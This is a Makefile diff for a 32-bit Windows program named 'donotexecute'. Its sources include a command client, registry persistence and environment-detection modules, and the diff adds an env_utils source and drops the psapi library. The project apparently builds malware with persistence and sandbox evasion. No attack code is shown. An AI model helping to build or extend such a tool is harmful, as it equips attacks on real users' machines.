@@ -1,7 +1,7 @@
 
-CC = C:/msys64/mingw32/bin/gcc.exe # C:/msys64/mingw32/bin/gcc.exe # Compiler
+CC = C:/msys64/mingw32/bin/gcc.exe # Compiler
 
-CFLAGS = -Wall -m32 # -g -O0 # -m32 # compiler flags
+CFLAGS = -Wall -m32 # compiler flags
 
 TARGET = donotexecute # output executable name
 
@@ -15,10 +15,11 @@ SRCS = \
 	src/client/client.c \
 	src/client/commands.c \
 	src/persistence/registry.c \
-	src/env_detection/env_detector.c
+	src/env_detection/env_detector.c \
+	src/env_detection/env_utils.c
 
 $(TARGET): $(SRCS)
-	$(CC) $(CFLAGS) -o $(TARGET) $(SRCS) -lwininet -liphlpapi -lpsapi
+	$(CC) $(CFLAGS) -o $(TARGET) $(SRCS) -lwininet -liphlpapi
 
 .PHONY: clean
 clean:
